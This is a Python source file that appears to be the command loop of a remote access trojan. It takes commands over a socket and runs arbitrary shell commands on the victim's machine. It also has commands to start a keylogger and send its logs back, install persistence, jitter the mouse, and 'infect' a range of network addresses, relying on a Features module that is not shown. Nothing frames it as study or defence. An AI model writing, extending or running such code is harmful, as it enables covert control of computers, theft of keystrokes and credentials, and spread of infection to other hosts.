import os
import socket
import subprocess
from Features.Features import Features

def receive_command(sock):
    buffer = sock.recv(1024)
    try:
        return buffer.decode('utf-8').strip()
    except UnicodeDecodeError:
        return buffer.decode('latin-1').strip()

def change_directory(path):
    try:
        os.chdir(path)
        return f"Changed directory to: {os.getcwd()}\n"
    except FileNotFoundError as e:
        return f"Error: {e}\n"

def execute_command(buffer):
    process = subprocess.Popen(buffer, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    return stdout.decode('latin-1') + stderr.decode('latin-1')

def infect_network(feature, sock, parts):
    network_prefix = '0.0.0'
    target_port = 80
    start_ip = 1
    end_ip = 100

    if len(parts) >= 2:
        network_prefix = parts[1]
    if len(parts) >= 3:
        target_port = int(parts[2])
    if len(parts) >= 4:
        start_ip = int(parts[3]) 
    if len(parts) >= 5:
        end_ip = int(parts[4])

    feature.infecting(sock, network_prefix, target_port, start_ip, end_ip)

def shell(sock):
    feature = Features()
    while True:
        try:
            buffer = receive_command(sock)

            if buffer.startswith('q'):
                sock.close()
                os._exit(0)
            
            elif buffer.startswith('cd '):
                path = buffer[3:].strip()
                response = change_directory(path)
                sock.sendall(response.encode())
            
            elif buffer.startswith('keylog'):
                feature.start_keylogger(sock)
                sock.sendall(b"Keylogger started.\n")

            elif buffer.startswith('stop_keylogger'):
                feature.stop_keylogger()
                sock.sendall(b"Keylogger stopped.\n")

            elif buffer.startswith('log'):
                feature.send_log(sock)

            elif buffer.startswith('delete_log'):
                feature.delete_log()
                sock.sendall(b"Log file deleted.\n")
            
            elif buffer.startswith('persist'):
                feature.persistence(sock)
            
            elif buffer.startswith('jitter'):
                feature.mouser_jitter(sock, 0.01, 1)
            
            elif buffer.startswith('infect'):
                infect_network(feature, sock, buffer.split())

            else:
                response = execute_command(buffer)
                sock.sendall(response.encode('utf-8'))

        except socket.error as e:
            try:
                sock.sendall(f"Socket error: {e}".encode())
            except socket.error:
                print("Connection lost. Exiting...")
                break
